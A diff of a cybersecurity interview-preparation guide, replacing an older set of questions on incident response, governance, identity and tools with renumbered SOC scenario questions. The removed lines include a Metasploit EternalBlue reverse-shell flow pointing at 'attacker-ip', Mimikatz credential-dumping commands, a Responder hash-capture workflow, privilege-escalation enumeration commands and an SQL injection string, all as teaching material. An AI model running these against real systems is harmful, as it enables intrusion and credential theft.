-| Exposed Kubernetes API server | Unauthenticated API = full cluster compromise |
-| Outdated base images | Known CVEs in container images |
-| Secrets in environment variables | Credentials visible in `docker inspect` |
-| Container escape | Vulnerabilities allowing breakout to host OS |
-
-> **Best practice:** Run containers as non-root, use read-only filesystems, scan images (Trivy), apply network policies in Kubernetes.
-
----
-
-## 12. INCIDENT RESPONSE & FORENSICS
-
----
-
-**Q106. [CRITICAL] What are the 6 phases of NIST Incident Response?**
-
-| Phase | What happens |
-|-------|-------------|
-| **1. Preparation** | Build playbooks, train team, deploy tools, establish contacts |
-| **2. Identification** | Detect the incident — SIEM alert, user report, threat hunting |
-| **3. Containment** | Short-term (isolate system) + long-term (patch vector) |
-| **4. Eradication** | Remove malware, close access, fix vulnerability |
-| **5. Recovery** | Restore systems, verify integrity, return to operation |
-| **6. Lessons Learned** | Post-incident review — what failed, what worked, improve |
-
----
-
-**Q107. [CRITICAL] What is the order of volatility in digital forensics?**
-
-Collect most volatile evidence first, as it's lost when systems are powered off:
-
-1. **CPU registers, cache** — Most volatile
-2. **RAM / Memory** (running processes, network connections, encryption keys)
-3. **Swap/Page file**
-4. **Network state** (ARP table, routing table, active connections)
-5. **Running processes**
-6. **Disk** (files, logs, registry)
-7. **Remote logs / SIEM**
-8. **Backups / Archives** — Least volatile
-
-> **Key point:** Never pull the power cord first — you'll lose everything in RAM, including potentially the encryption keys for an active ransomware incident.
-
----
-
-**Q108. What is the difference between volatile and non-volatile evidence?**
-
-- **Volatile:** Lost when system powers off — RAM contents, active network connections, running processes, ARP cache, clipboard data. **Collect first.**
-- **Non-volatile:** Persists after shutdown — hard drive, registry, log files, email, browser history.
-
----
-
-**Q109. What is chain of custody?**
-
-A documented, unbroken record tracking who handled evidence, when, and what was done — from collection through legal proceedings. Required for evidence to be admissible in court.
-
-> **Process:** Image drive (with write-blocker) → compute SHA-256 hash → seal in evidence bag with label (date, time, analyst, case number) → log every access. Any break in custody may invalidate the evidence.
-
----
-
-**Q110. What is a forensic image?**
-
-A bit-for-bit copy of a storage device capturing every sector — including deleted files, unallocated space, and slack space. Created with a write-blocker to ensure the original is not modified.
-
-> **Tools:** `dd`, FTK Imager, Autopsy. Hash (MD5/SHA-256) computed before and after to prove integrity.
-
----
-
-**Q111. What would you do if another company reports that attack traffic is coming from your IP?**
-
-1. Don't panic or admit anything prematurely — verify first
-2. Check logs for traffic originating from that IP at the reported time
-3. If confirmed — immediately **isolate** the source system
-4. Conduct malware scan and memory forensics — assume compromise
-5. Identify how the system was compromised (initial access vector)
-6. Begin full Incident Response process
-7. Preserve evidence before any remediation
-8. Communicate back to the reporting company professionally; cooperate
-9. Notify management and legal team (potential legal/compliance implications)
-
----
-
-**Q112. What is triage in incident response?**
-
-Quickly assessing and prioritising incidents based on severity, scope, and impact to allocate response resources effectively.
-
-> **Severity levels:**
-> - **P1/Critical** — Active attack, data exfiltration in progress, ransomware spreading
-> - **P2/High** — Confirmed compromise, contained but ongoing
-> - **P3/Medium** — Suspicious activity, possible compromise
-> - **P4/Low** — Policy violation, vulnerability discovered, no active exploitation
-
----
-
-## 13. SECURITY FRAMEWORKS & GOVERNANCE
-
----
-
-**Q113. [CRITICAL] What is the NIST Cybersecurity Framework (CSF)?**
-
-A voluntary framework providing a common language and structure for managing cybersecurity risk. Five core functions:
-
-| Function | Description |
-|----------|-------------|
-| **Identify** | Understand your assets, risks, and context |
-| **Protect** | Implement safeguards (access control, training, encryption) |
-| **Detect** | Continuously monitor for anomalies and events |
-| **Respond** | Contain, analyse, and mitigate incidents |
-| **Recover** | Restore operations, improve based on lessons learned |
-
----
-
-**Q114. What is ISO 27001?**
-
-An international standard for Information Security Management Systems (ISMS). Provides a framework for systematically managing and protecting information through risk assessment and treatment.
-
-> **Certification:** Organisations can achieve ISO 27001 certification through a third-party audit. Key requirement: risk assessment, treatment plan, set of controls (Annex A), and continuous improvement.
-
----
-
-**Q115. [CRITICAL] What is the difference between a vulnerability, threat, and risk?**
-
-- **Vulnerability** — A weakness (unpatched software, misconfigured service, human behaviour)
-- **Threat** — An agent or event that could exploit a vulnerability (attacker, natural disaster, insider)
-- **Risk** — The probability and impact of a threat exploiting a vulnerability
-
-> **Formula:** Risk = Likelihood × Impact
-> **Example:** Unpatched Apache (vulnerability) + publicly known exploit (threat) = Critical risk. Unpatched internal tool with no network exposure = Low risk.
-
----
-
-**Q116. What are the four responses to risk?**
-
-- **Avoidance** — Eliminate the risk by stopping the activity
-- **Mitigation** — Reduce likelihood or impact (patch, add controls)
-- **Transfer** — Move risk to a third party (insurance, outsourcing)
-- **Acceptance** — Acknowledge the risk as acceptable (documented decision)
-
-> **Example:** Can't patch a critical legacy system. Mitigation = network isolate it. Transfer = insure against breach. Acceptance = document the decision and its justification.
-
----
-
-**Q117. [CRITICAL] What is the principle of least privilege?**
-
-Users, systems, and processes should have only the minimum access required to perform their function.
-
-> **Why it matters:** If a compromised account has least privilege, the blast radius is limited. A marketing intern shouldn't have access to the financial database. A web server process shouldn't have write access to system directories.
-
----
-
-**Q118. What is separation of duties?**
-
-No single person should have sufficient access to both initiate and approve a sensitive action — requiring collusion to commit fraud or cause harm.
-
-> **Example:** The person who creates a vendor payment request should not also be the one who approves it. A developer should not also have production deployment rights without a change approval process.
-
----
-
-**Q119. What is RTO and RPO?**
-
-- **RTO (Recovery Time Objective)** — Maximum acceptable time to restore a system after disruption
-- **RPO (Recovery Point Objective)** — Maximum acceptable data loss measured in time (how old can the backup be?)
-
-> **Example:** RPO = 4 hours means backups every 4 hours — you can lose up to 4 hours of data. RTO = 2 hours means you must be back online within 2 hours of failure.
-
----
-
-**Q120. What is GDPR and what are its key requirements?**
-
-The EU's General Data Protection Regulation governs personal data handling for EU citizens.
-
-Key requirements:
-- Lawful basis for processing personal data
-- Data minimisation — collect only what you need
-- Right to access, right to erasure (right to be forgotten)
+**Key requirements:**
+- Must have a lawful basis to process personal data
+- Data minimisation — only collect what you need
+- Right to erasure ("right to be forgotten")
 - Breach notification within **72 hours** to the supervisory authority
-- Privacy by design
+- Privacy by design and default
 
-> **Penalty:** Up to €20M or **4% of global annual turnover** — whichever is higher.
-
----
-
-**Q121. What is PCI-DSS?**
-
-Payment Card Industry Data Security Standard. Requirements for organisations that handle cardholder data:
-- Maintain a secure network (firewalls)
-- Protect cardholder data (encrypt transmission)
-- Vulnerability management (patch, antivirus)
-- Access control (least privilege, MFA)
-- Monitor and test networks regularly
-- Maintain an information security policy
+**Penalty:** Up to €20 million or 4% of global annual turnover — whichever is higher.
 
 ---
 
-**Q122. What is the difference between a policy, standard, procedure, and guideline?**
+**83. What is PCI-DSS and who must comply?**
 
-| Document | Mandatory? | Specificity | Example |
-|----------|-----------|-------------|---------|
-| **Policy** | Yes | High-level | "All sensitive data must be encrypted" |
-| **Standard** | Yes | Specific requirements | "Use AES-256 for data at rest" |
-| **Procedure** | Yes | Step-by-step | "How to encrypt a database field" |
-| **Guideline** | No | Recommended | "Consider using hardware security modules" |
+PCI-DSS (Payment Card Industry Data Security Standard) applies to any organisation that processes, stores, or transmits payment card data. It sets requirements for securing cardholder data.
+
+Key requirements: encrypt cardholder data in transit and at rest, maintain a vulnerability management programme, restrict access (least privilege, MFA), monitor all access to network resources, maintain an information security policy.
 
 ---
 
-## 14. IDENTITY, ACCESS & AUTHENTICATION
+**84. What is the NIST Cybersecurity Framework?**
+
+A voluntary framework providing a common language for managing cybersecurity risk, organised around 5 functions:
+
+- **Identify** — Know your assets, risks, and environment
+- **Protect** — Implement safeguards (access control, training, encryption)
+- **Detect** — Monitor for threats and anomalies continuously
+- **Respond** — Contain, analyse, and mitigate incidents
+- **Recover** — Restore operations and improve after incidents
+
+> *Why it matters:* Many organisations map their security programme to the NIST CSF. Knowing it shows interviewers you understand security as a programme, not just individual tools.
 
 ---
 
-**Q123. [CRITICAL] What are the three authentication factors and what is MFA?**
+**85. What is the difference between a policy, standard, and procedure?**
 
-- **Something you know** — Password, PIN, security question
-- **Something you have** — Hardware token, smart card, authenticator app (OTP)
-- **Something you are** — Biometrics: fingerprint, retina, face recognition
+Three types of governance documents with different levels of specificity:
 
-**MFA** requires two or more **different** factors. Two passwords is NOT MFA. Password + OTP = MFA.
+- **Policy** — The high-level "what and why." Mandatory. "All sensitive data must be encrypted at rest."
+- **Standard** — The specific "how" requirements. Mandatory. "AES-256 must be used for data at rest encryption."
+- **Procedure** — The step-by-step "do this." How to implement the standard. "To encrypt a database column, follow these steps..."
 
-> **Common MFA bypass:** SIM swapping (hijacking phone number for SMS OTP), MFA fatigue attacks (spamming push notifications until user accepts), AiTM phishing (adversary-in-the-middle proxies that capture session cookies post-MFA).
-
----
-
-**Q124. What is AAA in security?**
-
-- **Authentication** — Prove identity (who are you?)
-- **Authorisation** — Determine permissions (what can you do?)
-- **Accounting** — Record activity (what did you do, when?)
-
-> **Protocols:** RADIUS (network access authentication), TACACS+ (device administration — separates AAA cleanly, full packet encryption).
+> *Analogy:* Policy = "We obey traffic laws." Standard = "Speed limit is 60km/h on highways." Procedure = "How to safely merge onto a highway."
 
 ---
 
-**Q125. What is Zero Trust and how is it implemented practically?**
-
-Zero Trust: assume no user, device, or network location is inherently trusted. Every access request is verified.
-
-**Implementation:**
-- MFA for all access
-- Device health verification (MDM/endpoint compliance)
-- Micro-segmentation (limit lateral movement)
-- Just-in-time (JIT) access — no standing privileges
-- Continuous monitoring and re-verification
-- Least privilege across all systems
+## SECTION 8: SCENARIO & THINKING QUESTIONS
+*These reveal how you reason, not just what you've memorised.*
 
 ---
 
-**Q126. What is SAML and how does SSO work?**
+**86. Your SIEM shows 5,000 failed login attempts on one account in 10 minutes, then a successful login. What happened and what do you do?**
 
-SAML (Security Assertion Markup Language) enables Single Sign-On (SSO) between an Identity Provider (IdP) and a Service Provider (SP).
-
-**Flow:**
-1. User attempts to access Salesforce (SP)
-2. Salesforce redirects to Okta (IdP)
-3. User authenticates with Okta (one time)
-4. Okta sends a **signed SAML assertion** to Salesforce
-5. Salesforce trusts the assertion — user is logged in
-
-> **Benefit:** One authentication → access to many applications. One place to enforce MFA, access policies, and revoke access.
-
----
-
-**Q127. What is the difference between RADIUS and TACACS+?**
-
-| Feature | RADIUS | TACACS+ |
-|---------|--------|---------|
-| Transport | UDP | TCP |
-| Encryption | Password field only | Entire payload |
-| AAA | Combined in one request | Fully separated |
-| Primary use | Wi-Fi/VPN authentication | Network device (router/switch) admin |
-| Vendor | Open standard | Cisco-proprietary (but open now) |
-
----
-
-**Q128. What is LDAP and what ports does it use?**
-
-LDAP (Lightweight Directory Access Protocol) queries and modifies directory services like Active Directory.
-
-- **Port 389** — Plaintext (avoid — credentials sent in clear)
-- **Port 636** — LDAPS (TLS encrypted)
-
-> **Security risk:** LDAP injection is similar to SQL injection — user input embedded in LDAP queries can manipulate directory lookups. Always sanitise input.
-
----
-
-**Q129. What is PAM (Privileged Access Management)?**
-
-A solution controlling, monitoring, and auditing access to privileged accounts (Domain Admin, root, service accounts).
-
-**Features:** Password vaulting (auto-rotation), session recording, just-in-time access, approval workflows, credential checkout.
-
-> **Example:** Instead of admins knowing the root password, they request it from CyberArk, which checks out a time-limited credential, records the session, and auto-rotates the password after use.
-
----
-
-## 15. PRACTICAL TOOLS & APPLIED KNOWLEDGE
-
-> **Why this matters:** Interviewers increasingly ask HOW you use tools, not just WHAT they are.
-
----
-
-**Q130. [CRITICAL] How would you use Wireshark to investigate suspicious traffic?**
-
-**Common filters:**
-- `tcp.port == 445` — Show only SMB traffic
-- `dns` — Show all DNS queries
-- `http.request.method == "POST"` — POST requests (look for credential submissions)
-- `ip.addr == 192.168.1.50` — Traffic to/from specific host
-- `tcp.flags.syn == 1 && tcp.flags.ack == 0` — SYN packets only (port scan detection)
-
-**Scenario — DNS exfiltration:** Filter `dns`. Look for unusually long query names, queries to a single external domain, or base64-looking subdomains.
-
-**Scenario — Lateral movement:** Filter `tcp.port == 445`. Unexpected SMB connections between workstations (not to file servers) is suspicious.
-
----
-
-**Q131. How would you use nmap and what are the key flags?**
-
-| Command | Purpose |
-|---------|---------|
-| `nmap -sn 192.168.1.0/24` | Ping sweep — find live hosts |
-| `nmap -sS target` | SYN scan (stealthy — doesn't complete handshake) |
-| `nmap -sV target` | Service/version detection |
-| `nmap -O target` | OS detection |
-| `nmap -A target` | Aggressive — OS, version, scripts, traceroute |
-| `nmap -p- target` | Scan all 65535 ports |
-| `nmap --script vuln target` | Run vulnerability detection scripts |
-
-> **Legal reminder:** Only scan systems you own or have written permission to test.
-
----
-
-**Q132. What is Splunk and how would you write a basic query?**
-
-Splunk is a SIEM/log analytics platform using its own query language: **SPL (Search Processing Language)**.
-
-**Basic queries:**
-```
-# Find all failed logins
-index=windows EventCode=4625
-
-# Count failed logins by user
-index=windows EventCode=4625 | stats count by Account_Name | sort -count
-
-# Find logins from non-standard hours (outside 8am-6pm)
-index=windows EventCode=4624 | eval hour=strftime(_time, "%H") | where hour < 8 OR hour > 18
-
-# Detect potential lateral movement
-index=windows EventCode=4624 Logon_Type=3 | stats dc(Computer) as machines by Account_Name | where machines > 5
-```
-
----
-
-**Q133. What is Metasploit and what are its core components?**
-
-A penetration testing framework providing exploits, payloads, and post-exploitation modules.
-
-| Component | Description |
-|-----------|-------------|
-| `msfconsole` | Main interface |
-| **Exploit** | Code that triggers a vulnerability |
-| **Payload** | Code that runs after exploitation (Meterpreter, shell) |
-| **Auxiliary** | Scanners, fuzzers, recon tools |
-| **Post** | Post-exploitation modules (hashdump, persistence) |
-| **Handler** | Listens for reverse connections |
-
-> **Basic flow:** `use exploit/windows/smb/ms17_010_eternalblue` → `set RHOSTS target` → `set PAYLOAD windows/x64/meterpreter/reverse_tcp` → `set LHOST attacker-ip` → `run`
-
----
-
-**Q134. What is Burp Suite used for?**
-
-Web application security testing. Core functions: proxy (intercept and modify HTTP/HTTPS traffic), scanner (find vulnerabilities), repeater (manually replay and modify requests), intruder (automated attacks — brute force, fuzzing).
-
-> **Common use:** Intercept a login POST request, modify parameters, test for SQLi or authentication bypass. Send to Repeater to test variations.
-
----
-
-**Q135. What is Mimikatz and what can it do?**
-
-A credential extraction tool that reads Windows authentication data from memory.
-
-| Command | Action |
-|---------|--------|
-| `sekurlsa::logonpasswords` | Dump credentials from LSASS |
-| `sekurlsa::tickets` | Dump Kerberos tickets |
-| `lsadump::sam` | Dump SAM database hashes |
-| `lsadump::dcsync` | Perform DCSync attack |
-| `kerberos::golden` | Create a Golden Ticket |
-| `kerberos::ptt` | Pass-the-Ticket |
-
-> **Detection:** EDR alerts on LSASS access, Windows Defender, Credential Guard prevents many Mimikatz techniques.
-
----
-
-**Q136. What is Responder and what does it do?**
-
-A tool that poisons LLMNR/NetBIOS/mDNS queries on a local network, responding to name resolution requests with the attacker's IP — then capturing Net-NTLMv2 hashes when victims authenticate.
-
-> **Workflow:** Run Responder → wait for LLMNR/NetBIOS queries (happen constantly in Windows environments) → hashes captured → crack offline with Hashcat or relay with ntlmrelayx.
-
----
-
-**Q137. What is the difference between rockyou.txt and SecLists?**
-
-- **rockyou.txt** — A wordlist of ~14 million real passwords from the 2009 RockYou breach. Default in Kali Linux at `/usr/share/wordlists/rockyou.txt` (compressed as `.gz`, decompress with `gunzip`). Best starting point for password attacks.
-- **SecLists** — A large collection of wordlists for many purposes: passwords, usernames, directory names, DNS subdomains, fuzzing payloads. Located in `/usr/share/seclists/`.
-
----
-
-**Q138. What is a basic process for privilege escalation enumeration on Linux?**
-
-```bash
-whoami && id                  # Current user and groups
-sudo -l                       # What can I run as sudo?
-find / -perm -4000 2>/dev/null  # Find SUID binaries
-cat /etc/crontab              # Check scheduled tasks
-ps aux                        # Running processes (any root processes?)
-env                           # Environment variables (any credentials?)
-ls -la /home                  # Other user home directories
-cat /etc/passwd               # User accounts
-uname -a                      # Kernel version (kernel exploits?)
-```
-
-> **GTFOBins** (gtfobins.github.io) — database of Unix binaries that can be exploited for privilege escalation, file read, file write, etc. if misconfigured.
-
----
-
-## 16. SCENARIO-BASED QUESTIONS
-
-> **Critical note:** These questions test your *thinking process*, not just your memory. Interviewers want to see methodical, logical reasoning. Always think out loud.
-
----
-
-**SCENARIO Q1. [CRITICAL] Your SIEM alerts at 2am: 10,000 failed logins to a single account in 5 minutes, then one successful login. What do you do?**
-
-**Thought process:**
-1. **Identify:** This pattern = brute force attack that succeeded. Treat as confirmed compromise.
-2. **Gather information immediately:**
-   - What account? (Regular user vs admin — severity differs enormously)
-   - Source IP(s) of the failed logins — single IP (simple brute force) or many IPs (distributed/credential stuffing)?
-   - Is the successful login from the same IP or different?
-   - Is the source IP internal or external?
-   - What resource was logged into? (VPN, web app, domain auth?)
-3. **Immediate containment:** Disable the compromised account. Block the source IP(s) at the perimeter.
-4. **Investigate the successful session:** What did this account do after logging in? Check subsequent 4688, 4672, 4698 events.
-5. **Assess blast radius:** Has the account's credentials been used elsewhere?
-6. **Escalate** to IR team and management if admin account or sensitive system.
-7. **Document everything** with timestamps.
-
----
-
-**SCENARIO Q2. Three workstations start encrypting files rapidly across network shares. What are your first actions?**
-
-**Thought process — speed matters here:**
-1. **Ransomware assessment:** This pattern (rapid file encryption across shares) = ransomware spreading. Time is critical.
-2. **Immediate containment:** Isolate affected workstations from network — physically disconnect or use EDR/NAC to quarantine. Do NOT shut them down immediately (lose RAM evidence including potential encryption keys).
-3. **Preserve RAM:** Memory dump if time permits before isolation — may contain encryption keys.
-4. **Identify patient zero:** Which machine started encrypting first? Check logs for the earliest events.
-5. **Assess spread:** Query EDR for other hosts showing similar behaviour. How far has it spread?
-6. **Notify:** Alert management, IR team, legal. Potential regulatory notification obligations.
-7. **Check backups:** Are they intact? Are they offline/offsite (not reachable by ransomware)?
-8. **Do not pay** ransom without legal/management guidance.
-9. **Identify the initial vector:** Phishing email? Exposed RDP? Vulnerable VPN?
-
----
-
-**SCENARIO Q3. An employee reports their machine is slow. Your EDR shows: powershell.exe was spawned by winword.exe, which then spawned cmd.exe, then net.exe. What is happening?**
-
-**Analysis:**
-- `winword.exe` (Word) spawning `powershell.exe` = **macro-based malware** — user opened a malicious Word document with an embedded macro
-- PowerShell spawning cmd.exe = PowerShell executing system commands
-- cmd.exe spawning net.exe = network reconnaissance (`net user`, `net group`, `net view`)
+**What happened:** A brute force attack succeeded. The attacker tried thousands of passwords and eventually found the right one.
 
 **What to do:**
-1. Immediately isolate the machine from the network
-2. Preserve the Word document (evidence)
-3. Memory dump for forensic analysis
-4. Check what commands were actually run (Event ID 4688 command-line, PowerShell 4104 logs)
-5. Check for network connections from that machine (C2 callback?)
-6. Check if the account has been used to authenticate anywhere else (lateral movement)
-7. Begin IR process, identify the malicious document source (email, USB, web download)
+1. Immediately disable the compromised account to prevent further activity
+2. Check what the account did after the successful login — what systems did it access? Did it create anything? Change anything?
+3. Identify the source IP(s) of the failed attempts — block them
+4. Check if the same IP has attempted other accounts
+5. Determine if the account was used for lateral movement
+6. Reset the password and require MFA before re-enabling
+7. Investigate how the correct password was found — was it in a leaked credential database?
+8. Document and escalate following your IR process
 
 ---
 
-**SCENARIO Q4. You notice a server making DNS queries for `aGVsbG8=.data.attacker.com` repeatedly. What do you suspect and what do you do?**
+**87. A user calls saying their computer is running very slowly and files are disappearing. What do you think is happening and what are your first steps?**
 
-**Analysis:**
-- `aGVsbG8=` is a base64-encoded string
-- DNS queries with base64-looking subdomains to an external domain = **DNS tunneling / C2 communication**
-- The server is likely compromised and communicating with an attacker's DNS server covertly
+**Initial hypothesis:** This could be ransomware in the early stages of encrypting files, a malware infection consuming resources, or disk failure — treat as ransomware until ruled out.
 
-**Actions:**
-1. Immediately isolate the server
-2. Block the domain at DNS/firewall level
-3. Identify what process is making the DNS queries (look at process making network calls)
-4. Decode the base64 strings — what data was being sent?
-5. Check how long this has been happening (scope of exfiltration)
-6. Memory and disk forensics to identify the malware
-7. Begin full IR process
+**First steps:**
+1. Ask the user to stop what they're doing and don't close anything
+2. Immediately isolate the machine from the network — disconnect from Wi-Fi or unplug ethernet. Do NOT shut it down.
+3. Check your EDR console — is there ransomware activity? Unusual process spawning? Rapid file modifications?
+4. If confirmed ransomware: initiate IR process, check if network shares are being encrypted, assess spread
+5. Preserve memory (RAM dump) if possible before any shutdown
+6. Identify what files have been changed and what process changed them
+7. Check for other machines showing the same behaviour
 
 ---
 
-**SCENARIO Q5. You're a new SOC analyst and your senior says an APT group is targeting your industry. How do you use this intelligence operationally?**
+**88. You're new to a SOC and receive an alert about a PowerShell command running on a workstation. How do you investigate?**
 
-**Thought process:**
-1. **Research the APT group:** MITRE ATT&CK, threat intel feeds (ISACs, vendor reports). Identify their known TTPs, preferred initial access methods, C2 infrastructure patterns.
-2. **Gap analysis:** Which of their known techniques do we have detections for? Which don't we?
-3. **Hunt proactively:** Build hunting hypotheses based on their TTPs. If they're known to use PowerShell for lateral movement — hunt for unusual PowerShell activity.
-4. **Detection rules:** Write/update SIEM rules mapped to their specific techniques.
-5. **Indicator blocking:** Import known bad IPs, domains, file hashes into security controls.
-6. **Phishing simulation:** If they use spear phishing — consider a targeted awareness exercise.
-7. **Tabletop exercise:** Simulate their attack chain with the IR team.
-
----
-
-**SCENARIO Q6. During a penetration test, you've gained access to a Windows workstation as a standard user. What is your privilege escalation methodology?**
-
-**Enumeration first — always:**
-1. `whoami /all` — Current privileges and group memberships
-2. `net user` and `net localgroup administrators` — Local users and admins
-3. `systeminfo` — OS version, patches (check for known kernel exploits)
-4. Check `AlwaysInstallElevated` registry key — allows MSI install as SYSTEM
-5. Check for unquoted service paths — `wmic service get name,pathname` 
-6. Check writable directories in service paths
-7. Check for stored credentials: `cmdkey /list`, credential manager
-8. Check scheduled tasks: `schtasks /query /fo LIST /v`
-9. Check running services for misconfigurations
-10. Use automated tools: **WinPEAS** to enumerate all potential vectors
+Methodical investigation steps:
+1. **What was the command?** Check Event ID 4688 (process creation with command-line logging) or PowerShell Event ID 4104 (script block logging)
+2. **What process spawned it?** The parent process matters. PowerShell spawned by `explorer.exe` (user ran it) is less suspicious than PowerShell spawned by `winword.exe` (macro malware)
+3. **What did the command do?** Did it make network connections? Write files? Access other systems?
+4. **Is the command encoded?** Base64-encoded PowerShell (`-EncodedCommand`) is a major red flag
+5. **Who was logged in?** Does this match what that user normally does?
+6. **Check the machine's network connections** around the same time — any outbound connections to unusual IPs?
+7. **Correlate with your threat intel** — does the command match known malware behaviour?
 
 ---
 
-**SCENARIO Q7. You discover a critical SQL injection vulnerability in a production web application. What do you report and what should be done?**
+**89. How would you explain what a firewall does to someone who has never worked in IT?**
 
-**Report should include:**
-- Vulnerability description with CVE reference if applicable
-- Affected URL and parameter
-- Proof of concept (showing impact without causing harm — e.g., `'OR'1'='1` returning extra data)
-- CVSS score and severity rating
-- Potential impact (data theft, auth bypass, DB destruction)
-- Remediation recommendation: parameterised queries / prepared statements
-- Temporary mitigation (WAF rule) while fix is developed
+"A firewall is like a security guard at the entrance of a building. When someone tries to come in or when someone inside tries to send something out, the guard checks it against a list of rules. If the visitor is expected and authorised — they get through. If they're not on the list, or they're trying to get into a restricted area, they're turned away. It doesn't check what people are carrying in detail — it mainly checks whether they should be there at all."
 
-**Response process:**
-1. Immediate notification to application owner and security team
-2. Temporary WAF rule to block exploitation (NOT a fix)
-3. Developer implements parameterised queries
-4. Code review for similar patterns across the application
-5. Regression testing
-6. Scheduled rescan to verify remediation
+> *Why this question is asked:* In a real job, you'll need to explain security concepts to non-technical colleagues, managers, and users. Communication is a core skill.
 
 ---
 
-**SCENARIO Q8. Your company's CEO receives an urgent email appearing to be from the CFO asking for an immediate $50,000 wire transfer. What type of attack is this and what controls prevent it?**
+**90. You find an open port 3389 (RDP) exposed to the internet on a production server. What is the risk and what would you recommend?**
 
-**Attack type:** **Business Email Compromise (BEC) / Whaling** — CEO fraud. A type of spear phishing targeting executives for financial fraud.
+**Risk:** RDP exposed to the internet is one of the most common initial access vectors for ransomware groups. Attackers scan the internet for open 3389 constantly and attempt brute force, credential stuffing, or exploit known RDP vulnerabilities (e.g., BlueKeep).
 
-**Why it works:** Urgency, authority (CFO), trust (internal appearance).
-
-**Technical controls:**
-- DMARC, DKIM, SPF — prevent email spoofing
-- Email gateway rules flagging external emails with internal display names
-- MFA on email accounts
-
-**Process controls:**
-- **Dual authorisation** for wire transfers above a threshold
-- Out-of-band verification (call the CFO on a known number, not one in the email)
-- Employee training — especially finance and executive assistants
+**Recommendations:**
+1. **Immediate:** If RDP must be used, put it behind a VPN — no direct internet exposure
+2. **Enable Network Level Authentication (NLA)** — requires authentication before session setup
+3. **Restrict by IP** — only allow known admin source IPs via firewall rules
+4. **Enable MFA** on the RDP accounts
+5. **Change the port** (security through obscurity — not a fix, but reduces automated scanning)
+6. **Audit who needs RDP access** — likely far fewer people than currently have it
+7. **If RDP isn't required** — close the port entirely
 
 ---
 
-## 17. BEHAVIORAL & SITUATIONAL QUESTIONS
+**91. What would you do on your first week as a SOC analyst to understand the environment you're protecting?**
 
-> **Why this matters:** Technical skills get you considered. Communication, judgement, and professionalism get you hired. These questions reveal how you think, handle pressure, and work with others.
+A strong answer shows curiosity and methodology:
 
----
-
-**Q139. How do you explain a complex security vulnerability to a non-technical executive?**
-
-**Framework:** Business impact first, then the threat, then the solution — in plain language.
-
-> **Bad answer:** "We have a SQL injection vulnerability with a CVSS score of 9.8 affecting our PostgreSQL backend."
->
-> **Good answer:** "There's a flaw in our website that could allow an attacker to extract our entire customer database, including personal information, in minutes. This could result in regulatory fines, customer lawsuits, and serious reputational damage. It's a known type of issue and our developers can fix it within 48 hours. In the meantime, we can add a temporary protective layer."
+1. **Asset inventory** — What systems, servers, and endpoints exist? What is the crown jewel data?
+2. **Network topology** — How is the network segmented? Where are the choke points?
+3. **Understand the SIEM** — What log sources are feeding in? What alerts exist and what are the thresholds?
+4. **Review recent incidents** — What attacks have hit this environment before? What was learned?
+5. **Review policies** — What are the acceptable use, incident response, and escalation policies?
+6. **Understand normal** — What does normal traffic and behaviour look like here? You can't spot anomalies without a baseline.
+7. **Meet the team** — Who do you escalate to? Who owns each system?
 
 ---
 
-**Q140. A developer says "security is slowing down the development process." How do you respond?**
+**92. You receive a phishing email at work that got through your email filters. What do you do?**
 
-**Collaborative, not confrontational:**
+**What you should NOT do:** Click anything, open attachments, try to investigate it from your work machine without a safe analysis environment.
 
-Acknowledge their concern — security reviews do add time. Then reframe: a breach causes far more delay and cost than a security review. Propose solutions: shift-left security (integrate security early, not at the end), developer security training, automated scanning in CI/CD pipelines, threat modelling at design stage. The goal is to be an enabler, not a gatekeeper.
-
----
-
-**Q141. You discover that a colleague has been accessing systems they're not authorised to. What do you do?**
-
-1. Do NOT confront the colleague directly
-2. Document your findings (screenshots, log excerpts) with timestamps
-3. Report to your direct manager and/or security team lead immediately
-4. Follow your company's Acceptable Use Policy and IR procedures
-5. Maintain confidentiality — don't discuss with other colleagues
-6. Cooperate fully with any investigation
-7. Preserve evidence — do not delete anything
-
-> **Key principle:** This is an insider threat situation. It must be handled through proper channels with evidence preserved for a potential HR or legal process.
+**What you should do:**
+1. **Report it immediately** using your organisation's reporting mechanism (don't just delete it — security needs the data)
+2. **Don't click** any links or open any attachments
+3. **Note the details** — sender, subject, time received, any URLs (hover, don't click)
+4. **Check if others received it** — is this a targeted or mass campaign?
+5. **Provide the full email headers** to the security team for analysis
+6. **Help the security team block** the sender domain and URLs at the gateway
+7. **Check if anyone else clicked** — if this is an active campaign, identify victims quickly
 
 ---
 
-**Q142. How do you stay current with cybersecurity threats and news?**
+**93. What is the first thing you do when you suspect a system has been compromised?**
 
-Strong answer demonstrates genuine engagement with the field:
+**Contain before you investigate.** The instinct is to start investigating — but if the attacker is still active, every second of delay allows more damage, more lateral movement, more exfiltration.
 
-- **Threat intel feeds:** CISA advisories, US-CERT, vendor bulletins (Microsoft MSRC, CrowdStrike)
-- **Communities:** r/netsec, Twitter/X security community, LinkedIn
-- **Research:** Blogs (SpecterOps, Google Project Zero, Krebs on Security)
-- **CTF competitions:** Hack The Box, TryHackMe, picoCTF
-- **Certifications:** Studying for CompTIA Security+, CEH, OSCP
-- **Podcasts/News:** Risky Business, Darknet Diaries, SANS Internet Stormcast
-
----
-
-**Q143. Describe a time you made a mistake in a technical task and how you handled it.**
-
-**What interviewers want:** Honesty, accountability, learning mindset.
-
-**STAR format:** Situation → Task → Action → Result
-
-> **Template:** "During [X], I mistakenly [action]. I immediately recognised the mistake and [what you did to fix it]. I notified [relevant party] and [steps taken]. As a result of this, I now [what process/check you added to prevent recurrence]."
-
-The worst answer is claiming you've never made a mistake.
+1. **Isolate the system** from the network first — without shutting it down
+2. **Document what you know** before touching anything — time, what triggered suspicion, what you observe
+3. **Preserve volatile evidence** — don't reboot
+4. **Notify your team** — don't investigate a potential incident alone
+5. **Then investigate** — once contained, you can look at logs, processes, connections safely
 
 ---
 
-**Q144. What would you do if you were asked by a manager to do something that violated security policy?**
+**94. If a colleague asks you to share your login credentials to check something "quickly," what do you do?**
 
-**Approach:** Professional, not adversarial.
+**Never share your credentials.** Period. Regardless of who is asking.
 
-1. Seek to understand the business need driving the request
-2. Explain the security risk clearly and its potential business impact
-3. Propose a compliant alternative that meets the business need
-4. If pressure persists, escalate to security leadership or through formal risk acceptance process (documented exception)
-5. If it appears to be a deliberate circumvention, consult the ethics/compliance channel
+The right response: "I can't share my credentials — that's against our security policy and it would also make it impossible to track who took which action in the logs. Let me help you by either logging in myself and showing you, or I can help you get the access you need through the proper request process."
 
-> **Never:** Silently comply with a policy violation. The risk is yours professionally if something goes wrong.
+> *Why this is a test question:* Interviewers want to see that you understand personal accountability, audit trail integrity, and that you won't break policy under social pressure. The correct answer is firm but not hostile.
 
 ---
 
